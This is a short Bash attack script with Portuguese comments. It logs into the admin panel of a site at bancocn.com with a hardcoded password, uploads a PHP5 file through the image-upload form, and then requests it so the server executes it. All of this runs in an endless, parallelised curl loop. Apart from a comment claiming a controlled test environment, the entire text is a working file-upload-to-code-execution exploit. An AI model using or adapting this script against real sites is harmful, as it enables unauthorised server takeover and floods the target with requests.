#!/bin/bash
# Script de teste em ambiente controlado, URLs fictícias
# NÃO use em sites de terceiros!

LOGIN="http://www.bancocn.com/admin/index.php"
UPLOAD="http://www.bancocn.com/admin/index.php"
AUTOPWN="http://www.bancocn.com/admin/uploads/lolol.php5"
FILE="lolol.php5"

while true; do
    for i in {1..5}; do
        # Simula login
        curl -s -d "user=admin&password=senhafoda" $LOGIN > /dev/null &

        # Simula upload de arquivo
        curl -s -F "title=$FILE" -F "image=@$FILE" -F "category=1" -F "Add=Add" $UPLOAD > /dev/null &

        # Simula execução de payload
        curl -s $AUTOPWN > /dev/null &
    done
    wait
done
